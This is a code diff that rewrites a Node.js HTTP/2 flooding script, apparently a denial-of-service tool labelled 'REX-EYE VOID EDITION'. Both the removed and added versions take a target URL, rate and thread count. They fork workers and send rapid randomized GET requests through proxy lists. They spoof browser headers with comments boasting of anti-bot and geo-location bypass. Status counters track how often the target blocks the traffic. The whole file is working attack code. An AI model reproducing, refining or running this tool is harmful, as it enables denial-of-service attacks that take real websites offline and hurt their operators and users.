@@ -10,373 +10,196 @@ process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 
 if (process.argv.length < 5){
-    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://example.com/ 120 16 4`); 
-    console.log(`Atau tanpa proxy: node tls.js https://example.com/ 120 16 4 --noproxy`);
+    console.log(`
+    REX-EYE VOID EDITION
+    Usage: node raw.js <url> <time> <rate> <threads> [--noproxy]
+    Example: node raw.js https://target.com 120 64 8
+    `); 
     process.exit();
 }
 
-// Cek apakah menggunakan proxy atau langsung
 const useProxy = process.argv[6] !== "--noproxy";
 
-// Support TLS 1.2 dan 1.3
-const ciphersTLS12 = [
+// Modern Cipher Suites - Support TLS 1.2 & 1.3
+const ciphers = [
     "TLS_AES_256_GCM_SHA384",
     "TLS_AES_128_GCM_SHA256",
     "TLS_CHACHA20_POLY1305_SHA256",
     "ECDHE-ECDSA-AES128-GCM-SHA256",
     "ECDHE-RSA-AES128-GCM-SHA256",
-    "ECDHE-ECDSA-AES256-GCM-SHA384",
-    "ECDHE-RSA-AES256-GCM-SHA384",
-    "ECDHE-ECDSA-CHACHA20-POLY1305",
-    "ECDHE-RSA-CHACHA20-POLY1305"
+    "ECDHE-ECDSA-CHACHA20-POLY1305"
 ].join(":");
 
-const ecdhCurve = "x25519:secp256r1:secp384r1";
-
-const secureOptions = 
- crypto.constants.SSL_OP_NO_SSLv2 |
- crypto.constants.SSL_OP_NO_SSLv3 |
- crypto.constants.SSL_OP_NO_TLSv1 |
- crypto.constants.SSL_OP_NO_TLSv1_1 |
- crypto.constants.ALPN_ENABLED |
- crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;
-
-const secureContextOptions = {
-    ciphers: ciphersTLS12,
+const secureContext = tls.createSecureContext({
+    ciphers: ciphers,
     honorCipherOrder: true,
-    secureOptions: secureOptions,
     minVersion: "TLSv1.2",
     maxVersion: "TLSv1.3"
-};
+});
 
-const secureContext = tls.createSecureContext(secureContextOptions);
-
-// Load proxies jika ada
 var proxies = [];
 if (useProxy) {
     try {
         proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
-        console.log(`📡 Loaded ${proxies.length} proxies`);
+        console.log(`[VOID] ${proxies.length} Global Proxies Loaded.`);
     } catch(e) {
-        console.log(`⚠️  No proxy.txt found, using direct connection`);
+        console.log(`[FATAL] proxy.txt NOT FOUND. Cannot bypass Geo-IP without proxies.`);
+        process.exit();
     }
 }
 
-// LOAD USER AGENTS FROM ua.txt
-var userAgents = [];
-try {
-    const uaFile = fs.readFileSync("ua.txt", "utf-8").toString();
-    userAgents = uaFile.split(/\r?\n/).filter(line => line.trim());
-    
-    if (userAgents.length === 0) {
-        console.log(`⚠️  ua.txt is empty, using default user agents`);
-        // Fallback user agents jika file kosong
-        userAgents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
-        ];
-    } else {
-        console.log(`🔄 Loaded ${userAgents.length} user agents from ua.txt`);
-        // Tampilkan contoh user agent pertama
-        console.log(`   Example: ${userAgents[0].substring(0, 50)}...`);
-    }
-} catch(e) {
-    console.log(`⚠️  ua.txt not found, using default user agents`);
-    // Fallback user agents jika file tidak ditemukan
-    userAgents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
-    ];
-}
+const userAgents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+];
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
-    Rate: ~~process.argv[4],
+    rate: ~~process.argv[4],
     threads: ~~process.argv[5]
-}
-
-const parsedTarget = url.parse(args.target);
-
-// Statistik global
-let stats = {
-    total: 0,
-    success: 0,
-    blocked: 0,
-    error: 0,
-    active: 0
 };
 
+const parsedTarget = url.parse(args.target);
+let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };
+
 if (cluster.isMaster) {
-    console.log(`🔥 Starting Flood Attack`);
-    console.log(`🎯 Target: ${args.target}`);
-    console.log(`⏱️  Duration: ${args.time} seconds`);
-    console.log(`⚡ Rate: ${args.Rate} req/sec per connection`);
-    console.log(`🧵 Threads: ${args.threads}`);
-    console.log(`🔒 TLS Version: 1.2 & 1.3`);
-    console.log(`🌐 Proxy Mode: ${useProxy ? "Enabled" : "Disabled"}`);
-    console.log(`🔄 User Agents: ${userAgents.length} loaded from ua.txt`);
-    console.log(`====================================`);
-    
-    // Live stats setiap 3 detik
-    const statsInterval = setInterval(() => {
-        console.log(`\n📊 STATS UPDATE [${new Date().toLocaleTimeString()}]:`);
-        console.log(`   Total: ${stats.total}`);
-        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
-        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
-        console.log(`   ❌ Error: ${stats.error}`);
-        console.log(`   🔗 Active: ${stats.active}`);
-    }, 3000);
-    
-    for (let counter = 1; counter <= args.threads; counter++) {
-        cluster.fork();
-    }
+    console.log(`🔥 REX-EYE STARTING... BYPASSING GEO-LOCATION`);
+    for (let i = 0; i < args.threads; i++) cluster.fork();
     
     setTimeout(() => {
-        clearInterval(statsInterval);
-        console.log(`\n✅ Attack Finished!`);
-        console.log(`📊 Final Stats:`);
-        console.log(`   Total Requests: ${stats.total}`);
-        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
-        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
-        console.log(`   ❌ Error: ${stats.error}`);
+        console.log(`\n[!] ATTACK DURATION REACHED. TERMINATING.`);
         process.exit(1);
     }, args.time * 1000);
 } else {
-    // Worker processes
-    console.log(`Worker ${cluster.worker.id} started`);
-    
-    // Multiple intervals per worker untuk rate yang lebih tinggi
-    const intervalsPerWorker = Math.min(50, args.Rate);
-    for (let i = 0; i < intervalsPerWorker; i++) {
-        setTimeout(() => {
-            setInterval(() => {
-                if (stats.active < 5000) {
-                    runFlooder();
-                }
-            }, Math.max(1, Math.floor(1000 / (args.Rate / intervalsPerWorker))));
-        }, i * 10);
-    }
+    // High-speed interval
+    setInterval(() => {
+        if (stats.active < 1000) runFlooder();
+    }, 1);
 }
 
-function randomIntn(min, max) {
-    return Math.floor(Math.random() * (max - min) + min);
-}
-
-function randomElement(elements) {
-    if (!elements || elements.length === 0) return "";
-    return elements[randomIntn(0, elements.length)];
-}
-
-function randomString(length) {
-    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    let result = "";
-    for (let i = 0; i < length; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-}
-
-function randomIP() {
-    return randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255);
+function randomString(l) {
+    return crypto.randomBytes(l).toString('hex').slice(0, l);
 }
 
 function runFlooder() {
     stats.active++;
     
-    const makeRequest = (proxyConn) => {
-        const settings = {
-            enablePush: false,
-            initialWindowSize: 2147483647,
-            maxConcurrentStreams: 1000
-        };
+    // ANTI-IP LEAK: Block request if proxy is needed but empty
+    if (useProxy && proxies.length === 0) {
+        stats.active--;
+        return;
+    }
 
+    const proxyAddr = useProxy ? proxies[Math.floor(Math.random() * proxies.length)] : null;
+    
+    const makeRequest = (connection) => {
         const tlsOptions = {
-            port: 443,
-            ALPNProtocols: ["h2", "http/1.1"],
-            ciphers: ciphersTLS12,
-            requestCert: false,
-            ecdhCurve: ecdhCurve,
-            honorCipherOrder: true,
-            host: parsedTarget.host,
-            rejectUnauthorized: false,
-            secureOptions: secureOptions,
-            secureContext: secureContext,
+            socket: connection,
+            ALPNProtocols: ["h2"], // Force HTTP/2
             servername: parsedTarget.host,
-            minVersion: "TLSv1.2",
-            maxVersion: "TLSv1.3"
+            secureContext: secureContext,
+            rejectUnauthorized: false,
+            decodeEmails: false
         };
 
-        // Jika ada proxy connection, gunakan socket dari proxy
-        if (proxyConn) {
-            tlsOptions.socket = proxyConn;
-        }
-
-        const tlsConn = proxyConn ? 
-            tls.connect(443, parsedTarget.host, tlsOptions) :
-            tls.connect(443, parsedTarget.host, tlsOptions);
-
-        tlsConn.setNoDelay(true);
-        tlsConn.setKeepAlive(true, 60000);
-        tlsConn.setMaxListeners(0);
-
-        let requestInterval;
-        
-        tlsConn.once("secureConnect", () => {
+        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions, () => {
             const client = http2.connect(parsedTarget.href, {
-                protocol: "https:",
-                settings: settings,
                 createConnection: () => tlsConn,
-                maxSessionMemory: 1000
+                settings: { enablePush: false, initialWindowSize: 6291456 }
             });
 
-            client.setMaxListeners(0);
-            
-            const startTime = Date.now();
-            
-            requestInterval = setInterval(() => {
-                const elapsed = Date.now() - startTime;
-                if (elapsed > args.time * 1000) {
-                    clearInterval(requestInterval);
-                    client.destroy();
-                    if (proxyConn) proxyConn.destroy();
-                    stats.active--;
-                    return;
-                }
-                
-                // Kirim request
-                const randomPath = parsedTarget.path + 
-                    (Math.random() > 0.5 ? "?" + randomString(8) + "=" + randomString(6) : "");
-                
+            const streamInterval = setInterval(() => {
                 const headers = {
+                    // H1-H3 Pseudo-Headers
                     [":method"]: "GET",
-                    [":path"]: randomPath,
+                    [":path"]: parsedTarget.path + "?" + randomString(8) + "=" + randomString(5),
                     [":scheme"]: "https",
                     [":authority"]: parsedTarget.host,
-                    "user-agent": randomElement(userAgents), // Mengambil dari ua.txt
-                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "accept-language": "en-US,en;q=0.9",
-                    "accept-encoding": "gzip, deflate, br",
-                    "cache-control": "no-cache",
-                    "pragma": "no-cache",
-                    "referer": "https://" + parsedTarget.host,
-                    "x-forwarded-for": randomIP(),
-                    "x-real-ip": randomIP()
+                    
+                    // Client Hints (Anti-Bot Bypass)
+                    "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
+                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "accept-encoding": "gzip, deflate, br, zstd",
+                    "accept-language": "en-US,en;q=0.9", // Fix Geo-detection
+                    "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": '"Windows"',
+                    "sec-fetch-dest": "document",
+                    "sec-fetch-mode": "navigate",
+                    "sec-fetch-site": "none",
+                    "sec-fetch-user": "?1",
+                    "upgrade-insecure-requests": "1",
+                    "referer": "https://www.google.com/",
+                    "cache-control": "no-cache"
                 };
-                
-                try {
-                    const request = client.request(headers);
-                    request.on("response", (responseHeaders) => {
-                        const statusCode = responseHeaders[":status"];
-                        stats.total++;
-                        
-                        if (statusCode === 200 || statusCode === 301 || statusCode === 302) {
-                            stats.success++;
-                        } else if (statusCode === 403 || statusCode === 503 || statusCode === 429) {
-                            stats.blocked++;
-                        } else {
-                            stats.error++;
-                        }
-                        
-                        request.close();
-                        request.destroy();
-                    });
-                    request.on("error", () => {
-                        stats.total++;
-                        stats.error++;
-                    });
-                    request.end();
-                } catch(e) {
-                    stats.total++;
-                    stats.error++;
-                }
-            }, Math.max(10, Math.floor(1000 / args.Rate)));
-            
-            client.requestInterval = requestInterval;
-        });
 
-        tlsConn.on("error", (err) => {
-            if (requestInterval) clearInterval(requestInterval);
-            if (proxyConn) proxyConn.destroy();
-            stats.active--;
-        });
-        
-        if (proxyConn) {
-            proxyConn.on("error", () => {
-                if (requestInterval) clearInterval(requestInterval);
+                const req = client.request(headers);
+                
+                // Set H2 Priority
+                req.setPriority({ weight: 256, exclusive: true });
+
+                req.on("response", (res) => {
+                    stats.total++;
+                    const status = res[":status"];
+                    if (status === 200) stats.success++;
+                    else if (status === 403 || status === 503) stats.blocked++;
+                    req.close();
+                    req.destroy();
+                });
+
+                req.on("error", () => {
+                    stats.error++;
+                    req.destroy();
+                });
+
+                req.end();
+            }, 1000 / args.rate);
+
+            // Auto-clean connection
+            setTimeout(() => {
+                clearInterval(streamInterval);
+                client.destroy();
                 tlsConn.destroy();
                 stats.active--;
-            });
-            
-            proxyConn.on("close", () => {
-                if (requestInterval) clearInterval(requestInterval);
-                stats.active--;
-            });
-        }
-        
-        tlsConn.on("close", () => {
-            if (requestInterval) clearInterval(requestInterval);
+            }, 5000); 
+        });
+
+        tlsConn.on("error", () => {
+            tlsConn.destroy();
             stats.active--;
         });
     };
-    
-    // Jika menggunakan proxy
-    if (useProxy && proxies.length > 0) {
-        const proxyAddr = randomElement(proxies);
-        if (proxyAddr) {
-            const parsedProxy = proxyAddr.split(":");
-            if (parsedProxy.length >= 2) {
-                const proxyConn = net.connect({
-                    host: parsedProxy[0],
-                    port: ~~parsedProxy[1],
-                    allowHalfOpen: true
-                });
-                
-                proxyConn.setTimeout(10000);
-                proxyConn.setKeepAlive(true, 30000);
-                
-                const payload = "CONNECT " + parsedTarget.host + ":443 HTTP/1.1\r\nHost: " + parsedTarget.host + "\r\nUser-Agent: " + randomElement(userAgents) + "\r\n\r\n";
-                
-                proxyConn.on("connect", () => {
-                    proxyConn.write(payload);
-                });
-                
-                proxyConn.on("data", (chunk) => {
-                    const response = chunk.toString();
-                    if (response.includes("200 Connection established") || response.includes("HTTP/1.1 200")) {
-                        proxyConn.removeAllListeners("data");
-                        makeRequest(proxyConn);
-                    } else {
-                        proxyConn.destroy();
-                        stats.active--;
-                    }
-                });
-                
-                proxyConn.on("error", () => {
-                    stats.active--;
-                });
-                
-                proxyConn.on("timeout", () => {
-                    proxyConn.destroy();
-                    stats.active--;
-                });
-                
-                return;
+
+    if (useProxy) {
+        const [host, port] = proxyAddr.split(":");
+        const proxySocket = net.connect(~~port, host);
+        
+        proxySocket.setKeepAlive(true, 60000);
+        proxySocket.setTimeout(5000);
+
+        proxySocket.once("connect", () => {
+            proxySocket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
+        });
+
+        proxySocket.on("data", (chunk) => {
+            if (chunk.toString().includes("200 Connection established")) {
+                makeRequest(proxySocket);
+            } else {
+                proxySocket.destroy();
             }
-        }
+        });
+
+        proxySocket.on("error", () => {
+            proxySocket.destroy();
+            stats.active--;
+        });
+    } else {
+        makeRequest(null);
     }
-    
-    // Direct connection (tanpa proxy)
-    makeRequest(null);
 }
 
-process.on('uncaughtException', (error) => {
-    if (stats.active > 0) stats.active--;
-});
-process.on('unhandledRejection', (error) => {});
+// Global Error Handlers
+process.on('uncaughtException', () => {});
+process.on('unhandledRejection', () => {});
